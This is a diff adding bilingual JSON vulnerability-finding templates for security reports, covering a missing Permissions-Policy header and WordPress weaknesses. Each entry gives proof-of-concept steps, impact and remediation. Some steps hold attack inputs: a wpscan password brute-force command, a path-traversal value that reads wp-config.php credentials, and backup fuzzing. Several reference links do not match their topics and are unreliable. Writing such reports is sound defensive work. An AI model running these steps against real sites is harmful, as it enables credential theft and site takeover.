+      "description": "La aplicación no implementa la cabecera HTTP Permissions-Policy (anteriormente Feature-Policy), permitiendo que funcionalidades del navegador sensibles estén disponibles sin restricciones.",
+      "poc": "1. Verificar cabeceras de respuesta: buscar Permissions-Policy o Feature-Policy\n2. Intentar acceder a APIs sensibles: geolocation, camera, microphone, notifications\n3. Verificar si la aplicación puede ser embebida y usar estas funcionalidades\n4. Comprobar si scripts de terceros pueden abusar de estas características",
+      "impact": "Funcionalidades del navegador como geolocalización, cámara, micrófono o notificaciones pueden ser abusadas por atacantes o scripts de terceros sin consentimiento explícito.",
+      "remediation": "Implementar cabecera Permissions-Policy deshabilitando funcionalidades no necesarias: geolocation=(), camera=(), microphone=(), payment=(), usb=(), magnetometer=(), gyroscope=().",
+      "cvss": "4.2",
+      "reference": "MDN Permissions-Policy: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Permissions-Policy"
+    },
+    "en": {
+      "title": "Missing Permissions-Policy Header",
+      "description": "The application does not implement the Permissions-Policy HTTP header (formerly Feature-Policy), allowing sensitive browser features to be available without restrictions.",
+      "poc": "1. Check response headers: look for Permissions-Policy or Feature-Policy\n2. Try accessing sensitive APIs: geolocation, camera, microphone, notifications\n3. Verify if the application can be embedded and use these features\n4. Check if third-party scripts can abuse these capabilities",
+      "impact": "Browser features such as geolocalización, camera, microphone or notifications could be abused by attackers or third-party scripts without explicit consent.",
+      "remediation": "Implement Permissions-Policy header disabling unnecessary features: geolocation=(), camera=(), microphone=(), payment=(), usb=(), magnetometer=(), gyroscope=().",
+      "cvss": "4.2",
+      "reference": "MDN Permissions-Policy: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Permissions-Policy"
+    }
+  },
+  "wordpress_xmlrpc": {
+    "key": "wordpress_xmlrpc",
+    "es": {
+      "title": "WordPress XML-RPC Habilitado (xmlrpc.php)",
+      "description": "El archivo xmlrpc.php de WordPress está habilitado y accesible, permitiendo ataques de fuerza bruta a distancia, pingbacks DDoS y escaneo de puertos internos.",
+      "poc": "1. Verificar existencia de xmlrpc.php: https://sitio.com/xmlrpc.php\n2. Enviar petición POST con método system.listMethods para listar métodos disponibles\n3. Probar método wp.getUsersBlogs con credenciales para fuerza bruta\n4. Verificar si permite pingbacks: utilizar para ataques DDoS o SSRF",
+      "impact": "Un atacante puede realizar ataques de fuerza bruta masivos, usar el sitio como proxy para ataques DDoS, escanear puertos internos o enumerar información sensible del sistema.",
+      "remediation": "Deshabilitar XML-RPC si no se utiliza: añadir código en .htaccess para bloquear acceso, usar plugin de seguridad que lo desactive, o implementar reglas WAF que bloqueen peticiones a xmlrpc.php.",
+      "cvss": "7.5",
+      "reference": "OWASP WordPress Security: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/09-Test_Upload_of_Malicious_Files"
+    },
+    "en": {
+      "title": "WordPress XML-RPC Enabled (xmlrpc.php)",
+      "description": "The WordPress xmlrpc.php file is enabled and accessible, allowing remote brute force attacks, DDoS pingbacks, and internal port scanning.",
+      "poc": "1. Verify xmlrpc.php exists: https://site.com/xmlrpc.php\n2. Send POST request with system.listMethods method to list available methods\n3. Test wp.getUsersBlogs method with credentials for brute force\n4. Check if pingbacks are allowed: can be used for DDoS attacks or SSRF",
+      "impact": "An attacker can perform massive brute force attacks, use the site as a proxy for DDoS attacks, scan internal ports, or enumerate sensitive system information.",
+      "remediation": "Disable XML-RPC if not needed: add code in .htaccess to block access, use security plugin to disable it, or implement WAF rules to block requests to xmlrpc.php.",
+      "cvss": "7.5",
+      "reference": "OWASP WordPress Security: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/09-Test_Upload_of_Malicious_Files"
+    }
+  },
+  "wordpress_rest_enum": {
+    "key": "wordpress_rest_enum",
+    "es": {
+      "title": "WordPress Enumeración de Usuarios via REST API",
+      "description": "La API REST de WordPress permite enumerar usuarios válidos mediante el endpoint /wp-json/wp/v2/users/, exponiendo información sensible como IDs, nombres de usuario y avatares.",
+      "poc": "1. Acceder a /wp-json/wp/v2/users/ y verificar que devuelve lista de usuarios\n2. Iterar sobre IDs: /wp-json/wp/v2/users/1, /wp-json/wp/v2/users/2, etc.\n3. Verificar parámetro per_page para listar más usuarios: ?per_page=100\n4. Analizar respuesta JSON para extraer slug (nombre de usuario), nombre y email",
+      "impact": "Un atacante puede obtener una lista completa de usuarios válidos, facilitando ataques de fuerza bruta dirigidos, spear phishing o recolección de información para ingeniería social.",
+      "remediation": "Restringir acceso a la API REST: usar plugins como \"Disable REST API\" o \"WP REST API Controller\", añadir autenticación requerida, o implementar reglas .htaccess para bloquear /wp-json/wp/v2/users/.",
+      "cvss": "5.3",
+      "reference": "WPScan WordPress Security: https://wpscan.com/wordpress-security-headers"
+    },
+    "en": {
+      "title": "WordPress User Enumeration via REST API",
+      "description": "The WordPress REST API allows enumerating valid users through the /wp-json/wp/v2/users/ endpoint, exposing sensitive information such as IDs, usernames and avatars.",
+      "poc": "1. Access /wp-json/wp/v2/users/ and verify it returns user list\n2. Iterate over IDs: /wp-json/wp/v2/users/1, /wp-json/wp/v2/users/2, etc.\n3. Check per_page parameter to list more users: ?per_page=100\n4. Analyze JSON response to extract slug (username), name and email",
+      "impact": "An attacker can obtain a complete list of valid users, facilitating targeted brute force attacks, spear phishing, or information gathering for social engineering.",
+      "remediation": "Restrict access to REST API: use plugins like \"Disable REST API\" or \"WP REST API Controller\", require authentication, or implement .htaccess rules to block /wp-json/wp/v2/users/.",
+      "cvss": "5.3",
+      "reference": "WPScan WordPress Security: https://wpscan.com/wordpress-security-headers"
+    }
+  },
+  "wordpress_error_enum": {
+    "key": "wordpress_error_enum",
+    "es": {
+      "title": "WordPress Enumeración de Usuarios por Mensaje de Error",
+      "description": "Los mensajes de error en el login de WordPress permiten determinar si un nombre de usuario es válido, diferenciando entre \"usuario no existe\" y \"contraseña incorrecta\".",
+      "poc": "1. Intentar login con usuario inexistente: usuariofalso123 / cualquierpass\n2. Observar mensaje: \"ERROR: El nombre de usuario usuariofalso123 no está registrado\"\n3. Intentar login con usuario válido: admin / contraseñafalsa\n4. Observar mensaje diferente: \"ERROR: La contraseña introducida para admin no es correcta\"",
+      "impact": "Un atacante puede enumerar usuarios válidos mediante fuerza bruta de nombres de usuario, facilitando ataques dirigidos de fuerza bruta sobre contraseñas de usuarios conocidos.",
+      "remediation": "Unificar mensajes de error para no revelar si el usuario existe: usar plugins como \"Login Lockdown\" o \"Wordfence\", o añadir código al functions.php para filtrar mensajes de error.",
+      "cvss": "5.0",
+      "reference": "OWASP Authentication: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/03-Testing_for_Weak_Lock_Out_Mechanism"
+    },
+    "en": {
+      "title": "WordPress User Enumeration via Error Messages",
+      "description": "WordPress login error messages allow determining if a username is valid, differentiating between \"user does not exist\" and \"incorrect password\".",
+      "poc": "1. Attempt login with non-existent user: fakeuser123 / anypassword\n2. Observe message: \"ERROR: The username fakeuser123 is not registered\"\n3. Attempt login with valid user: admin / wrongpassword\n4. Observe different message: \"ERROR: The password you entered for admin is incorrect\"",
+      "impact": "An attacker can enumerate valid users through username brute force, facilitating targeted brute force attacks on passwords of known users.",
+      "remediation": "Unify error messages to not reveal if user exists: use plugins like \"Login Lockdown\" or \"Wordfence\", or add code to functions.php to filter error messages.",
+      "cvss": "5.0",
+      "reference": "OWASP Authentication: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/03-Testing_for_Weak_Lock_Out_Mechanism"
+    }
+  },
+  "wordpress_login_brute": {
+    "key": "wordpress_login_brute",
+    "es": {
+      "title": "WordPress Fuerza Bruta en Login (/wp-login.php)",
+      "description": "El formulario de login de WordPress no implementa protecciones adecuadas contra ataques de fuerza bruta, permitiendo intentos ilimitados de autenticación.",
+      "poc": "1. Identificar formulario de login: /wp-login.php o /wp-admin\n2. Usar herramienta como Burp Intruder, Hydra o WPScan:\n   wpscan --url https://sitio.com --passwords passwords.txt --usernames admin\n3. Probar múltiples combinaciones usuario/contraseña sin bloqueo\n4. Verificar ausencia de CAPTCHA, rate limiting o bloqueo de cuentas",
+      "impact": "Un atacante puede realizar ataques de fuerza bruta automatizados para obtener credenciales válidas, comprometiendo cuentas de administrador o usuarios.",
+      "remediation": "Implementar limitación de intentos de login: usar plugins como \"Login Lockdown\", \"Limit Login Attempts Reloaded\" o \"Wordfence\". Añadir CAPTCHA (reCAPTCHA v3) y autenticación de dos factores (2FA).",
+      "cvss": "7.2",
+      "reference": "OWASP Brute Force: https://owasp.org/www-community/attacks/Brute_force_attack"
+    },
+    "en": {
+      "title": "WordPress Brute Force on Login (/wp-login.php)",
+      "description": "The WordPress login form does not implement adequate protections against brute force attacks, allowing unlimited authentication attempts.",
+      "poc": "1. Identify login form: /wp-login.php or /wp-admin\n2. Use tools like Burp Intruder, Hydra or WPScan:\n   wpscan --url https://site.com --passwords passwords.txt --usernames admin\n3. Try multiple username/password combinations without lockout\n4. Verify absence of CAPTCHA, rate limiting or account lockout",
+      "impact": "An attacker can perform automated brute force attacks to obtain valid credentials, compromising administrator or user accounts.",
+      "remediation": "Implement login attempt limiting: use plugins like \"Login Lockdown\", \"Limit Login Attempts Reloaded\" or \"Wordfence\". Add CAPTCHA (reCAPTCHA v3) and two-factor authentication (2FA).",
+      "cvss": "7.2",
+      "reference": "OWASP Brute Force: https://owasp.org/www-community/attacks/Brute_force_attack"
+    }
+  },
+  "wordpress_plugin_enum": {
+    "key": "wordpress_plugin_enum",
+    "es": {
+      "title": "WordPress Enumeración de Plugins",
+      "description": "Los plugins de WordPress pueden ser enumerados mediante análisis de rutas específicas, archivos CSS/JS únicos o errores diferenciales, revelando plugins instalados y sus versiones.",
+      "poc": "1. Analizar fuente HTML en busca de rutas de plugins: /wp-content/plugins/nombre-plugin/\n2. Probar rutas comunes: /wp-content/plugins/akismet/, /wp-content/plugins/woocommerce/\n3. Verificar archivo readme.txt: /wp-content/plugins/nombre-plugin/readme.txt\n4. Usar WPScan: wpscan --url https://sitio.com --enumerate p",
+      "impact": "Un atacante puede identificar plugins vulnerables, versiones desactualizadas o plugins personalizados con vulnerabilidades conocidas para explotación posterior.",
+      "remediation": "Ocultar información de plugins: usar plugins de seguridad como \"Sucuri\" o \"iThemes Security\", eliminar readme.txt de plugins, y mantener todos los plugins actualizados.",
+      "cvss": "5.3",
+      "reference": "WPScan Plugin Enumeration: https://wpscan.com/wordpress-security-headers"
+    },
+    "en": {
+      "title": "WordPress Plugin Enumeration",
+      "description": "WordPress plugins can be enumerated through analysis of specific paths, unique CSS/JS files or differential errors, revealing installed plugins and their versions.",
+      "poc": "1. Analyze HTML source for plugin paths: /wp-content/plugins/plugin-name/\n2. Test common paths: /wp-content/plugins/akismet/, /wp-content/plugins/woocommerce/\n3. Check readme.txt file: /wp-content/plugins/plugin-name/readme.txt\n4. Use WPScan: wpscan --url https://site.com --enumerate p",
+      "impact": "An attacker can identify vulnerable plugins, outdated versions or custom plugins with known vulnerabilities for subsequent exploitation.",
+      "remediation": "Hide plugin information: use security plugins like \"Sucuri\" or \"iThemes Security\", remove readme.txt from plugins, and keep all plugins updated.",
+      "cvss": "5.3",
+      "reference": "WPScan Plugin Enumeration: https://wpscan.com/wordpress-security-headers"
+    }
+  },
+  "wordpress_theme_enum": {
+    "key": "wordpress_theme_enum",
+    "es": {
+      "title": "WordPress Enumeración de Temas",
+      "description": "Los temas de WordPress pueden ser enumerados mediante análisis de la fuente HTML, rutas de CSS/JS específicas o errores diferenciales, revelando el tema activo y temas instalados.",
+      "poc": "1. Analizar fuente HTML en busca de rutas de temas: /wp-content/themes/nombre-tema/\n2. Verificar style.css del tema: /wp-content/themes/nombre-tema/style.css\n3. Probar temas comunes: /wp-content/themes/twentytwentyfour/, /wp-content/themes/astra/\n4. Usar WPScan: wpscan --url https://sitio.com --enumerate t",
+      "impact": "Un atacante puede identificar temas vulnerables, versiones desactualizadas o temas personalizados con vulnerabilidades para explotación posterior.",
+      "remediation": "Ocultar información de temas: usar plugins de seguridad, eliminar style.css público si es posible, y mantener todos los temas actualizados.",
+      "cvss": "5.3",
+      "reference": "WPScan Theme Enumeration: https://wpscan.com/wordpress-security-headers"
+    },
+    "en": {
+      "title": "WordPress Theme Enumeration",
+      "description": "WordPress themes can be enumerated through HTML source analysis, specific CSS/JS paths or differential errors, revealing the active theme and installed themes.",
+      "poc": "1. Analyze HTML source for theme paths: /wp-content/themes/theme-name/\n2. Check theme style.css: /wp-content/themes/theme-name/style.css\n3. Test common themes: /wp-content/themes/twentytwentyfour/, /wp-content/themes/astra/\n4. Use WPScan: wpscan --url https://site.com --enumerate t",
+      "impact": "An attacker can identify vulnerable themes, outdated versions or custom themes with vulnerabilities for subsequent exploitation.",
+      "remediation": "Hide theme information: use security plugins, remove public style.css if possible, and keep all themes updated.",
+      "cvss": "5.3",
+      "reference": "WPScan Theme Enumeration: https://wpscan.com/wordpress-security-headers"
+    }
+  },
+  "wordpress_config_exposure": {
+    "key": "wordpress_config_exposure",
+    "es": {
+      "title": "WordPress wp-config.php Expuesto",
+      "description": "El archivo wp-config.php, que contiene credenciales de base de datos y claves de seguridad, puede ser accesible debido a configuraciones incorrectas del servidor web o copias de respaldo.",
+      "poc": "1. Intentar acceder a wp-config.php directamente: https://sitio.com/wp-config.php\n2. Buscar copias de respaldo: wp-config.php.bak, wp-config.php~, wp-config.old\n3. Verificar wp-config.php en directorios de backup: /backup/wp-config.php\n4. Probar acceso mediante LFI: ?file=../../wp-config.php",
+      "impact": "Exposición de credenciales de base de datos, claves de cifrado y configuración sensible, permitiendo acceso completo a la base de datos y potencial compromiso del sitio.",
+      "remediation": "Asegurar wp-config.php: moverlo fuera del directorio web si es posible, configurar reglas .htaccess para denegar acceso, y eliminar copias de respaldo de directorios accesibles.",
+      "cvss": "9.1",
+      "reference": "OWASP Sensitive Data Exposure: https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure"
+    },
+    "en": {
+      "title": "WordPress wp-config.php Exposed",
+      "description": "The wp-config.php file, which contains database credentials and security keys, may be accessible due to incorrect web server configurations or backup copies.",
+      "poc": "1. Try accessing wp-config.php directly: https://site.com/wp-config.php\n2. Look for backup copies: wp-config.php.bak, wp-config.php~, wp-config.old\n3. Check backup directories: /backup/wp-config.php\n4. Try LFI access: ?file=../../wp-config.php",
+      "impact": "Exposure of database credentials, encryption keys and sensitive configuration, allowing full database access and potential site compromise.",
+      "remediation": "Secure wp-config.php: move it outside web directory if possible, configure .htaccess rules to deny access, and remove backup copies from accessible directories.",
+      "cvss": "9.1",
+      "reference": "OWASP Sensitive Data Exposure: https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure"
+    }
+  },
+  "wordpress_uploads_directory": {
+    "key": "wordpress_uploads_directory",
+    "es": {
+      "title": "WordPress Listado de Directorio /wp-content/uploads/",
+      "description": "El directorio de uploads de WordPress permite el listado de archivos y directorios, exponiendo información sensible sobre la estructura del sitio y archivos subidos.",
+      "poc": "1. Acceder a /wp-content/uploads/ y verificar si muestra listado de directorios\n2. Navegar subdirectorios: /wp-content/uploads/2024/, /wp-content/uploads/2023/\n3. Buscar archivos sensibles subidos: .zip, .sql, .bak, archivos de backup\n4. Enumerar estructura de carpetas por año/mes para encontrar contenido",
+      "impact": "Un atacante puede descubrir archivos sensibles subidos, estructura de contenido, plugins/temas a través de uploads, y usar esta información para ataques dirigidos.",
+      "remediation": "Deshabilitar listado de directorios: añadir Options -Indexes al .htaccess, o crear archivos index.php vacíos en directorios de uploads. Configurar permisos apropiados.",
+      "cvss": "4.3",
+      "reference": "OWASP Directory Listing: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/04-Review_Webserver_Metafiles_for_Information_Leakage"
+    },
+    "en": {
+      "title": "WordPress /wp-content/uploads/ Directory Listing",
+      "description": "The WordPress uploads directory allows file and directory listing, exposing sensitive information about site structure and uploaded files.",
+      "poc": "1. Access /wp-content/uploads/ and verify if directory listing is enabled\n2. Navigate subdirectories: /wp-content/uploads/2024/, /wp-content/uploads/2023/\n3. Search for sensitive uploaded files: .zip, .sql, .bak, backup files\n4. Enumerate year/month folder structure to find content",
+      "impact": "An attacker can discover sensitive uploaded files, content structure, plugins/themes through uploads, and use this information for targeted attacks.",
+      "remediation": "Disable directory listing: add Options -Indexes to .htaccess, or create empty index.php files in upload directories. Configure appropriate permissions.",
+      "cvss": "4.3",
+      "reference": "OWASP Directory Listing: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/04-Review_Webserver_Metafiles_for_Information_Leakage"
+    }
+  },
+  "wordpress_version_leak": {
+    "key": "wordpress_version_leak",
+    "es": {
+      "title": "WordPress Filtrado de Versión",
+      "description": "La versión de WordPress instalada se filtra a través de múltiples vectores: meta tags, feeds, archivos CSS/JS, y readme.html, facilitando ataques dirigidos a vulnerabilidades específicas.",
+      "poc": "1. Verificar meta tag generator: <meta name=\"generator\" content=\"WordPress 6.4.2\" />\n2. Consultar feed RSS: /feed/ buscando <generator>https://wordpress.org/?v=6.4.2</generator>\n3. Verificar query string en recursos: ?ver=6.4.2 en CSS/JS\n4. Acceder a readme.html: /readme.html muestra versión instalada",
+      "impact": "Un atacante puede identificar vulnerabilidades específicas de la versión instalada y usar exploits conocidos para comprometer el sitio.",
+      "remediation": "Ocultar versión de WordPress: añadir código al functions.php para remover el meta generator, usar plugins de seguridad que oculten la versión, y eliminar readme.html.",
+      "cvss": "5.3",
+      "reference": "WPScan WordPress Version: https://wpscan.com/wordpress-security-headers"
+    },
+    "en": {
+      "title": "WordPress Version Leakage",
+      "description": "The installed WordPress version is leaked through multiple vectors: meta tags, feeds, CSS/JS files, and readme.html, facilitating targeted attacks on specific vulnerabilities.",
+      "poc": "1. Check generator meta tag: <meta name=\"generator\" content=\"WordPress 6.4.2\" />\n2. Query RSS feed: /feed/ looking for <generator>https://wordpress.org/?v=6.4.2</generator>\n3. Check query string in resources: ?ver=6.4.2 in CSS/JS\n4. Access readme.html: /readme.html shows installed version",
+      "impact": "An attacker can identify specific vulnerabilities of the installed version and use known exploits to compromise the site.",
+      "remediation": "Hide WordPress version: add code to functions.php to remove meta generator, use security plugins that hide the version, and remove readme.html.",
+      "cvss": "5.3",
+      "reference": "WPScan WordPress Version: https://wpscan.com/wordpress-security-headers"
+    }
+  },
+  "wordpress_db_backup": {
+    "key": "wordpress_db_backup",
+    "es": {
+      "title": "WordPress Backups de Base de Datos Expuestos",
+      "description": "Archivos de backup de la base de datos (.sql, .sql.gz, .zip) se encuentran accesibles en directorios públicos, exponiendo todo el contenido de la base de datos.",
+      "poc": "1. Buscar archivos de backup comunes: /backup/, /backups/, /wp-content/backup-db/\n2. Probar nombres de archivo: backup.sql, database.sql, sitio.sql.gz\n3. Verificar archivos con timestamp: backup_20240115.sql, db_backup.zip\n4. Usar fuzzing para encontrar archivos de backup olvidados",
+      "impact": "Exposición completa de la base de datos incluyendo usuarios, contraseñas hasheadas, contenido privado y configuración sensible, permitiendo compromiso total del sitio.",
+      "remediation": "Mover backups fuera del directorio web: almacenar en ubicación no accesible públicamente, implementar autenticación para descargas de backup, y usar extensiones no ejecutables.",
+      "cvss": "9.1",
+      "reference": "OWASP Sensitive Data Exposure: https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure"
+    },
+    "en": {
+      "title": "WordPress Database Backups Exposed",
+      "description": "Database backup files (.sql, .sql.gz, .zip) are accessible in public directories, exposing the entire database contents.",
+      "poc": "1. Search for common backup files: /backup/, /backups/, /wp-content/backup-db/\n2. Try filenames: backup.sql, database.sql, site.sql.gz\n3. Check timestamped files: backup_20240115.sql, db_backup.zip\n4. Use fuzzing to find forgotten backup files",
+      "impact": "Complete exposure of database including users, hashed passwords, private content and sensitive configuration, allowing total site compromise.",
+      "remediation": "Move backups outside web directory: store in non-publicly accessible location, implement authentication for backup downloads, and use non-executable extensions.",
+      "cvss": "9.1",
+      "reference": "OWASP Sensitive Data Exposure: https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure"
+    }
+  }
+}
